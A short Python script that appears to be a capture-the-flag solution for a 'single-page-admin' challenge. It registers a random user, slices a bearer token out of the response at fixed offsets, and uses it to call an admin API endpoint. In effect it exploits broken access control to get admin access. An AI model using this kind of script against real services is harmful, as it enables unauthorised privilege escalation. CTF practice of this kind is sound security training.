import requests,random,string


site = 'https://single-page-admin.challs.olicyber.it/'

s = requests.Session()

s.get(site)

r = s.post(site+'api/register', json={"username": f"{random.choices(string.ascii_lowercase, k=10)}"})

token = r.text[60:96]


s.headers.update({
    "Authorization":f"Bearer {token}",
    "Content-Type":"application/json"
})

r = s.post(site+'api/admin',json={})
print(r.text)
